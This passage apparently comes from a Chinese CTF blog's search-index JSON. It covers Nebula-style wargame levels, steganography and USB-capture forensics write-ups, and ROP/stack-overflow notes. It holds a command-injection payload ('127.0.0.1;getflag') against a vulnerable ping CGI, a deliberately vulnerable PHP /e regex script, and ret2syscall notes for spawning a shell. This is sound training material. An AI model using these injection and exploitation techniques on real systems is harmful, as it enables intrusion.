results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;\"</span>);</div><div class=\"line\"></div><div class=\"line\">  @output = <span class=\"string\">`ping -c 3 $host 2&gt;&amp;1`</span>;</div><div class=\"line\">  <span class=\"keyword\">foreach</span> $line (@output) &#123; <span class=\"keyword\">print</span> <span class=\"string\">\"$line\"</span>; &#125;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">print</span>(<span class=\"string\">\"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;\"</span>);</div><div class=\"line\">  </div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># check if Host set. if not, display normal page, etc</span></div><div class=\"line\"></div><div class=\"line\">ping(param(<span class=\"string\">\"Host\"</span>))</div></pre></td></tr></table></figure>\n<h3 id=\"Key-Points-7\"><a href=\"#Key-Points-7\" class=\"headerlink\" title=\"Key Points\"></a>Key Points</h3><h3 id=\"Writeups-4\"><a href=\"#Writeups-4\" class=\"headerlink\" title=\"Writeups\"></a>Writeups</h3><p><code>127.0.0.1;getflag</code></p>\n<h2 id=\"level08\"><a href=\"#level08\" class=\"headerlink\" title=\"level08\"></a>level08</h2><h3 id=\"About-8\"><a href=\"#About-8\" class=\"headerlink\" title=\"About\"></a>About</h3><p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>\n<p>To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.</p>\n<h3 id=\"key-Points\"><a href=\"#key-Points\" class=\"headerlink\" title=\"key Points\"></a>key Points</h3><p><code>7f</code> –&gt; <code>del</code></p>\n<h3 id=\"Writeups-5\"><a href=\"#Writeups-5\" class=\"headerlink\" title=\"Writeups\"></a>Writeups</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">000000D5  01                                               .</div><div class=\"line\">000000D6  00 0d 0a 50 61 73 73 77  6f 72 64 3a 20          ...Passw ord:</div><div class=\"line\">000000B9  62                                               b</div><div class=\"line\">000000BA  61                                               a</div><div class=\"line\">000000BB  63                                               c</div><div class=\"line\">000000BC  6b                                               k</div><div class=\"line\">000000BD  64                                               d</div><div class=\"line\">000000BE  6f                                               o</div><div class=\"line\">000000BF  6f                                               o</div><div class=\"line\">000000C0  72                                               r</div><div class=\"line\">000000C1  7f                                               .</div><div class=\"line\">000000C2  7f                                               .</div><div class=\"line\">000000C3  7f                                               .</div><div class=\"line\">000000C4  30                                               0</div><div class=\"line\">000000C5  30                                               0</div><div class=\"line\">000000C6  52                                               R</div><div class=\"line\">000000C7  6d                                               m</div><div class=\"line\">000000C8  38                                               8</div><div class=\"line\">000000C9  7f                                               .</div><div class=\"line\">000000CA  61                                               a</div><div class=\"line\">000000CB  74                                               t</div><div class=\"line\">000000CC  65                                               e</div><div class=\"line\">000000CD  0d                                               .</div></pre></td></tr></table></figure>\n<p>Password is <strong>backd00Rmate</strong></p>\n<h2 id=\"level09\"><a href=\"#level09\" class=\"headerlink\" title=\"level09\"></a>level09</h2><h3 id=\"ABout\"><a href=\"#ABout\" class=\"headerlink\" title=\"ABout\"></a>ABout</h3><p>There’s a C setuid wrapper for some vulnerable PHP code…</p>\n<p>To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.</p>\n<h3 id=\"SourceCode-5\"><a href=\"#SourceCode-5\" class=\"headerlink\" title=\"SourceCode\"></a>SourceCode</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">spam</span><span class=\"params\">($email)</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  $email = preg_replace(<span class=\"string\">\"/\\./\"</span>, <span class=\"string\">\" dot \"</span>, $email);</div><div class=\"line\">  $email = preg_replace(<span class=\"string\">\"/@/\"</span>, <span class=\"string\">\" AT \"</span>, $email);</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"keyword\">return</span> $email;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">markup</span><span class=\"params\">($filename, $use_me)</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  $contents = file_get_contents($filename);</div><div class=\"line\"></div><div class=\"line\">  $contents = preg_replace(<span class=\"string\">\"/(\\[email (.*)\\])/e\"</span>, <span class=\"string\">\"spam(\\\"\\\\2\\\")\"</span>, $contents);</div><div class=\"line\">  $contents = preg_replace(<span class=\"string\">\"/\\[/\"</span>, <span class=\"string\">\"&lt;\"</span>, $contents);</div><div class=\"line\">  $contents = preg_replace(<span class=\"string\">\"/\\]/\"</span>, <span class=\"string\">\"&gt;\"</span>, $contents);</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">return</span> $contents;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">$output = markup($argv[<span class=\"number\">1</span>], $argv[<span class=\"number\">2</span>]);</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> $output;</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"key-Points-1\"><a href=\"#key-Points-1\" class=\"headerlink\" title=\"key  Points\"></a>key  Points</h3>","categories":["CTF","Writeup"],"tags":["Pwn"]},{"title":"Routine Training:Misc","url":"http://yoursite.com/CTF/Writeup/RoutineTraining-Misc/","content":"<h1 id=\"Routine-Training-Misc\"><a href=\"#Routine-Training-Misc\" class=\"headerlink\" title=\"Routine Training:Misc\"></a>Routine Training:Misc</h1><!-- MarkdownTOC -->\n<ul>\n<li><a href=\"#break-in-2017\">Break In 2017</a><ul>\n<li><a href=\"#mysterious-gif\">Mysterious GIF</a></li>\n</ul>\n</li>\n<li><a href=\"#alexctf-2017\">AlexCTF-2017</a><ul>\n<li><a href=\"#usb-probing\">USB probing</a></li>\n</ul>\n</li>\n</ul>\n<!-- /MarkdownTOC -->\n<h2 id=\"Break-In-2017\"><a href=\"#Break-In-2017\" class=\"headerlink\" title=\"Break In 2017\"></a>Break In 2017</h2><h3 id=\"Mysterious-GIF\"><a href=\"#Mysterious-GIF\" class=\"headerlink\" title=\"Mysterious GIF\"></a>Mysterious GIF</h3><ul>\n<li>Step 1</li>\n</ul>\n<p><code>binwalk</code> 发现有额外数据</p>\n<p>继续对<code>temp.zip</code>文件进行<code>binwalk</code>，发现有大量<code>zip</code></p>\n<p>解压出来是一堆加密过的文件</p>\n<ul>\n<li>Step 2</li>\n</ul>\n<p>继续分析gif文件，发现每一帧文件的metadata出有异常数据，尝试进行提取</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> identify -format <span class=\"string\">\"%s %c \\n\"</span> Question.gif </span></div><div class=\"line\">0 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172</div><div class=\"line\">...</div><div class=\"line\">24 484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f</div></pre></td></tr></table></figure>\n<ul>\n<li>Step 3</li>\n</ul>\n<p>base64 解码得到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><div class=\"line\">MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDdMNbL5qVWiCQr</div><div class=\"line\">X2w69q/7y3ShIPueptxfAwRQbROre30c6Uw/oK8weZTx44m0ALouhV46KcQJkhrq</div><div class=\"line\">...</div><div class=\"line\">HKw5C+fwAXlFItm09aEVTXw+xzLJb2Sr6gATPWM5qVaubxfsb5mXH/wD9iCLhJSo</div><div class=\"line\">rK0RHZktPbEs5ytDsqBHd5PFFw==</div></pre></td></tr></table></figure>\n<p>猜测为公玥文件</p>\n<ul>\n<li>Step 4</li>\n</ul>\n<p>对由<code>temp.zip</code>得到的一堆文件进行解密</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">$</span><span class=\"bash\">openssl rsautl -decrypt -inkey ../key -<span class=\"keyword\">in</span> partaa.enc </span></div><div class=\"line\">JFIFC</div></pre></td></tr></table></figure>\n<p>有第一份文件解密结果猜测此为一个完整的Jpg文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> `ls`</span></div><div class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">&gt; <span class=\"keyword\">do</span></span></div><div class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">&gt; openssl rsautl -decrypt -inkey ../key  -<span class=\"keyword\">in</span> <span class=\"variable\">$i</span> &gt;&gt; flag.jpg</span></div><div class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">&gt; <span class=\"keyword\">done</span></span></div></pre></td></tr></table></figure>\n<h2 id=\"AlexCTF-2017\"><a href=\"#AlexCTF-2017\" class=\"headerlink\" title=\"AlexCTF-2017\"></a>AlexCTF-2017</h2><h3 id=\"USB-probing\"><a href=\"#USB-probing\" class=\"headerlink\" title=\"USB probing\"></a>USB probing</h3><ul>\n<li>Step 1</li>\n</ul>\n<p><code>binwalk</code> 发现存在<code>png</code></p>\n<ul>\n<li>Step 2</li>\n</ul>\n<p>分析协议后使用<code>tshark</code>进行提取</p>\n<p><code>tshark -r Usb-probing.pcap -T fields -e usb.capdata|tr -d &#39;:&#39;|tr -d &#39;\\n&#39;|grep &quot;8950\\w*&quot; -o &gt; raw</code></p>\n<ul>\n<li>Step 3</li>\n</ul>\n<p>还原为png图片</p>\n<p><code>xxd -p -r raw png</code></p>\n<p><img src=\"/CTF/Writeup/RoutineTraining-Misc/Usb Probing\" alt=\"Usb Probing\"></p>\n","categories":["CTF","Writeup"],"tags":["Misc"]},{"title":"栈溢出","url":"http://yoursite.com/CTF/Pwn/栈溢出/","content":"<h1 id=\"栈溢出\"><a href=\"#栈溢出\" class=\"headerlink\" title=\"栈溢出\"></a>栈溢出</h1><!-- MarkdownTOC -->\n<ul>\n<li><a href=\"#rop\">ROP</a><ul>\n<li><a href=\"#ret2text\">Ret2Text</a><ul>\n<li><a href=\"#%E9%A2%98%E7%9B%AE\">题目</a></li>\n</ul>\n</li>\n<li><a href=\"#ret2shellcode\">Ret2ShellCode</a></li>\n<li><a href=\"#ret2syscall\">Ret2SysCall</a><ul>\n<li><a href=\"#%E7%90%86%E8%AE%BA\">理论</a></li>\n<li><a href=\"#%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE\">相关题目</a></li>\n</ul>\n</li>\n<li><a href=\"#ret2libc\">Ret2Libc</a></li>\n</ul>\n</li>\n<li><a href=\"#advanced-rop\">Advanced ROP</a><ul>\n<li><a href=\"#ret2libcscuinit\">Ret2__libc_scu_init</a></li>\n<li><a href=\"#ret2-dlresolve\">Ret2 dl_resolve</a></li>\n<li><a href=\"#srop\">SROP</a></li>\n</ul>\n</li>\n</ul>\n<!-- /MarkdownTOC -->\n<h2 id=\"ROP\"><a href=\"#ROP\" class=\"headerlink\" title=\"ROP\"></a>ROP</h2><h3 id=\"Ret2Text\"><a href=\"#Ret2Text\" class=\"headerlink\" title=\"Ret2Text\"></a>Ret2Text</h3><p>ret2text即需要我们控制程序执行程序本身已有的的代码(.text)</p>\n<h4 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h4><ul>\n<li><a href=\"https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rop-1\" target=\"_blank\" rel=\"external\">pico-ctf-2013:rop-1</a></li>\n<li><a href=\"https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rop-2\" target=\"_blank\" rel=\"external\">pico-ctf-2013:rop-2</a></li>\n<li><a href=\"/CTF/Writeup/RoutineTraining-Pwn/#Pwnme200\">湖湘杯-2016：Pwnme</a></li>\n</ul>\n<h3 id=\"Ret2ShellCode\"><a href=\"#Ret2ShellCode\" class=\"headerlink\" title=\"Ret2ShellCode\"></a>Ret2ShellCode</h3><p>ret2shellcode需要我们控制程序执行shellcode代码。</p>\n<h3 id=\"Ret2SysCall\"><a href=\"#Ret2SysCall\" class=\"headerlink\" title=\"Ret2SysCall\"></a>Ret2SysCall</h3><h4 id=\"理论\"><a href=\"#理论\" class=\"headerlink\" title=\"理论\"></a>理论</h4><p>ret2syscall需要我们控制程序执行系统调用，获取shell  </p>\n<p>系统调用执行条件: </p>\n<ul>\n<li>把系统调用的编号存入 EAX  </li>\n<li>把函数参数存入其它通用寄存器  </li>\n<li>触发 0x80 号中断（int 0x80）  </li>\n</ul>\n<p>例如：</p>\n<p>执行<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p>\n<p>X86下</p>\n<ul>\n<li>系统调用号即eax应该为0xb</li>\n<li>第一个参数即ebx应该指向/bin/sh的地址</li>\n<li>第二个参数即ecx应该为0</li>\n<li>第三个参数edx应该为0</li>\n</ul>\n<h4 id=\"相关题目\"><a href=\"#相关题目\" class=\"headerlink\" title=\"相关题目\"></a>相关题目</h4><ul>\n<li><a href=\"http://vancir.com/posts/ret2syscall%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B\" target=\"_blank\" rel=\"external\">ret2syscall攻击技术示例</a></li>\n</ul>\n<h3 id=\"Ret2Libc\"><a href=\"#Ret2Libc\" class=\"headerlink\" title=\"Ret2Libc\"></a>Ret2Libc</h3><p>ret2libc即控制函数的执行 libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)</p>\n<ul>\n<li><a href=\"/CTF/Writeup/RoutineTraining-Pwn/#R0pbaby\">Defcon 2015 Qualifier：R0pbaby</a></li>\n</ul>\n<h2 id=\"Advanced-ROP\"><a href=\"#Advanced-ROP\" class=\"headerlink\" title=\"Advanced ROP\"></a>Advanced ROP</h2><h3 id=\"Ret2-libc-scu-init\"><a href=\"#Ret2-libc-scu-init\" class=\"headerlink\" title=\"Ret2__libc_scu_init\"></a>Ret2__libc_scu_init</h3><h3 id=\"Ret2-dl-resolve\"><a href=\"#Ret2-dl-resolve\" class=\"headerlink\" title=\"Ret2 dl_resolve\"></a>Ret2 dl_resolve</h3><h3 id=\"SROP\"><a href=\"#SROP\" class=\"headerlink\" title=\"SROP\"></a>SROP</h3>","categories":["CTF","Pwn"],"tags":["Pwn"]},{"title":"Pwn","url":"http://yoursite.com/CTF/Pwn/Pwn/","content":"<h1 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h1><!-- MarkdownTOC -->\n<ul>\n<li><a href=\"#%E9%80%9A%E7%94%A8%E6%8A%80%E5%B7%A7\">通用技巧</a><ul>\n<li><a href=\"#linux%E5%91%BD%E4%BB%A4\">Linux命令</a><ul>\n<li><a href=\"#readelf\">readelf</a></li>\n<li><a href=\"#ropgadget\">ROPgadget</a></li>\n</ul>\n</li>\n<li><a href=\"#gdb\">GDB</a><ul>\n<li><a href=\"#peda\">peda</a></li>\n<li><a href=\"#pwndbg\">pwndbg</a></li>\n</ul>\n</li>\n<li><a href=\"#pwntools\">Pwntools</a></li>\n</ul>\n</li>\n<li><a href=\"#%E6%A0%88%E6%BA%A2%E5%87%BA\">栈溢出</a></li>\n</ul>\n<!-- /MarkdownTOC -->\n<h2 id=\"通用技巧\"><a href=\"#通用技巧\" class=\"headerlink\" title=\"通用技巧\"></a>通用技巧</h2><h3 id=\"Linux命令\"><a href=\"#Linux命令\" class=\"headerlink\" title=\"Linux命令\"></a>Linux命令</h3><h4 id=\"readelf\"><a href=\"#readelf\" class=\"headerlink\" title=\"readelf\"></a>readelf</h4><ul>\n<li><code>ELF header</code>: <code>readelf -h</code></li>\n<li><code>.dynamic</code> section: <code>readelf -d</code></li>\n<li><code>.rel.plt;.rel.dyn</code> section: <code>readelf -r</code></li>\n<li><code>.dynsym</code> section: <code>readelf -s</code></li>\n</ul>\n<h4 id=\"ROPgadget\"><a href=\"#ROPgadget\" class=\"headerlink\" title=\"ROPgadget\"></a>ROPgadget</h4><ul>\n<li><code>ROPgadget --binary bin --string  &quot;/bin/sh&quot;</code></li>\n</ul>\n<h3 id=\"GDB\"><a href=\"#GDB\" class=\"headerlink\" title=\"GDB\"></a>GDB</h3><h4 id=\"peda\"><a href=\"#peda\" class=\"headerlink\" title=\"peda\"></a>peda</h4><h4 id=\"pwndbg\"><a href=\"#pwndbg\" class=\"headerlink\" title=\"pwndbg\"></a>pwndbg</h4><ul>\n<li>heap 命令不支持32位程序</li>\n</ul>\n<blockquote>\n<p>dpkg –add-architecture i386<br>apt-get install libc6:i386<br>apt-get install libc6-dbg:i386</p>\n</blockquote>\n<h3 id=\"Pwntools\"><a href=\"#Pwntools\" class=\"headerlink\" title=\"Pwntools\"></a>Pwntools</h3><h2 id=\"栈溢出\"><a href=\"#栈溢出\" class=\"headerlink\" title=\"栈溢出\"></a><a href=\"/CTF/Pwn/栈溢出/index.html\">栈溢出</a></h2>","categories":["CTF","Pwn"],"tags":["Pwn"]},{"title":"Misc","url":"http://yoursite.com/CTF/Misc/Misc/","content":"<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><!-- MarkdownTOC -->\n<ul>\n<li><a href=\"#%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2\">编码转换</a></li>\n<li><a href=\"#%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81--%E9%9A%90%E5%86%99%E5%88%86%E6%9E%90\">数字取证 &amp;&amp; 隐写分析</a><ul>\n<li><a href=\"#%E5%9B%BE%E7%89%87\">图片</a><ul>\n<li><a href=\"#%E9%80%9A%E7%94%A8%E6%8A%80%E5%B7%A7\">通用技巧</a><ul>\n<li><a href=\"#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4\">常用命令</a></li>\n</ul>\n</li>\n<li><a href=\"#png\">PNG</a></li>\n<li><a href=\"#jpg\">JPG</a></li>\n<li><a href=\"#gif\">GIF</a><ul>\n<li><a href=\"#%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F\">文件格式</a></li>\n<li><a href=\"#%E6%97%B6%E9%97%B4%E8%BD%B4\">时间轴</a></li>\n<li><a href=\"#%E7%A9%BA%E9%97%B4%E5%9F%9F\">空间域</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#%E9%9F%B3%E9%A2%91%E6%96%87%E4%BB%B6\">音频文件</a></li>\n<li><a href=\"#%E5%8E%8B%E7%BC%A9%E5%8C%85\">压缩包</a><ul>\n<li><a href=\"#zip\">Zip</a></li>\n</ul>\n</li>\n<li><a href=\"#%E6%B5%81%E9%87%8F%E5%8C%85\">流量包</a><ul>\n<li><a href=\"#%E9%80%9A%E7%94%A8%E6%8A%80%E5%B7%A7-1\">通用技巧</a><ul>\n<li><a href=\"#wireshark\">Wireshark</a></li>\n<li><a href=\"#tshark\">tshark</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#%E8%84%91%E5%9B%BE\">脑图</a></li>\n</ul>\n<!-- /MarkdownTOC -->\n<h2 id=\"编码转换\"><a href=\"#编码转换\" class=\"headerlink\" title=\"编码转换\"></a>编码转换</h2><ul>\n<li><p>Other</p>\n<ul>\n<li><p>代码类编码，附一个<a href=\"https://tio.run/#\" target=\"_blank\" rel=\"external\">在线编辑器</a></p>\n<blockquote>\n<p>知乎上有个<a href=\"https://www.zhihu.com/question/63387608\" target=\"_blank\" rel=\"external\">讨论帖</a><br><a href=\"https://esolangs.org/wiki/Hello_world_program_in_esoteric_languages\" target=\"_blank\" rel=\"external\">hello world in esoteric languages</a></p>\n</blockquote>\n<ul>\n<li><p><a href=\"http://tool.ph0en1x.com/brainfuck/\" target=\"_blank\" rel=\"external\">BrainFuck</a></p>\n<p><code>++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.</code></p>\n</li>\n<li><p><a href=\"http://tool.ph0en1x.com/brainfuck/\" target=\"_blank\" rel=\"external\">Ook</a></p>\n<p><code>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook!</code></p>\n</li>\n<li><p>JsFuck</p>\n<p><code>[ ]( ) ! +</code></p>\n</li>\n<li><p><a href=\"http://tmxk.org/jother/\" target=\"_blank\" rel=\"external\">Jother</a></p>\n<p><code>! + ( ) [ ] { }</code></p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"数字取证-amp-amp-隐写分析\"><a href=\"#数字取证-amp-amp-隐写分析\" class=\"headerlink\" title=\"数字取证 &amp;&amp; 隐写分析\"></a>数字取证 &amp;&amp; 隐写分析</h2><h3 id=\"图片\"><a href=\"#图片\" class=\"headerlink\" title=\"图片\"></a>图片</h3><h4 id=\"通用技巧\"><a href=\"#通用技巧\" class=\"headerlink\" title=\"通用技巧\"></a>通用技巧</h4><h5 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h5><ul>\n<li><a href=\"https://www.imagemagick.org/script/escape.php\" target=\"_blank\" rel=\"external\">identift -format 参数</a></li>\n</ul>\n<h4 id=\"PNG\"><a href=\"#PNG\" class=\"headerlink\" title=\"PNG\"></a>PNG</h4><ul>\n<li><p>LSB隐写</p>\n</li>\n<li><p>Steg Software</p>\n</li>\n</ul>\n<h4 id=\"JPG\"><a href=\"#JPG\" class=\"headerlink\" title=\"JPG\"></a>JPG</h4><ul>\n<li>Steg Software</li>\n</ul>\n<h4 id=\"GIF\"><a href=\"#GIF\" class=\"headerlink\" title=\"GIF\"></a>GIF</h4><h5 id=\"文件格式\"><a href=\"#文件格式\" class=\"headerlink\" title=\"文件格式\"></a>文件格式</h5><ul>\n<li><a href=\"/CTF/Writeup/RoutineTraining-Misc/#mysterious-gif\">Break In 2017:Mysterious GIF</a> </li>\n</ul>\n<h5 id=\"时间轴\"><a href=\"#时间轴\" class=\"headerlink\" title=\"时间轴\"></a>时间轴</h5><h5 id=\"空间域\"><a href=\"#空间域\" class=\"headerlink\" title=\"空间域\"></a>空间域</h5><h3 id=\"音频文件\"><a href=\"#音频文件\" class=\"headerlink\" title=\"音频文件\"></a>音频文件</h3><ul>\n<li>频谱</li>\n<li>波形</li>\n<li>Steg Software</li>\n</ul>\n<h3 id=\"压缩包\"><a href=\"#压缩包\" class=\"headerlink\" title=\"压缩包\"></a>压缩包</h3><h4 id=\"Zip\"><a href=\"#Zip\" class=\"headerlink\" title=\"Zip\"></a>Zip</h4><ul>\n<li>爆破</li>\n<li>CRC32爆破</li>\n<li>明文攻击</li>\n<li>伪加密</li>\n</ul>\n<h3 id=\"流量包\"><a href=\"#流量包\" class=\"headerlink\" title=\"流量包\"></a>流量包</h3><h4 id=\"通用技巧-1\"><a href=\"#通用技巧-1\" class=\"headerlink\" title=\"通用技巧\"></a>通用技巧</h4><h5 id=\"Wireshark\"><a href=\"#Wireshark\" class=\"headerlink\" title=\"Wireshark\"></a>Wireshark</h5><h5 id=\"tshark\"><a href=\"#tshark\" class=\"headerlink\" title=\"tshark\"></a>tshark</h5><ul>\n<li><a href=\"/CTF/Writeup/RoutineTraining-Misc/#usb-probing\">AlexCTF-2017:USB probing</a></li>\n</ul>\n<h2 id=\"脑图\"><a href=\"#脑图\" class=\"headerlink\" title=\"脑图\"></a>脑图</h2><p><img src=\"/CTF/Misc/Misc/Misc.png\" alt=\"1\"></p>\n","categories":["CTF","Misc"],"tags":["Misc"]},{"title":"标签","url":"http://yoursite.com/tags/index.html","content":"","categories":[],"tags":[]},{"title":"分类","url":"http://yoursite.com/categories/index.html","content":"","categories":[],"tags":[]}]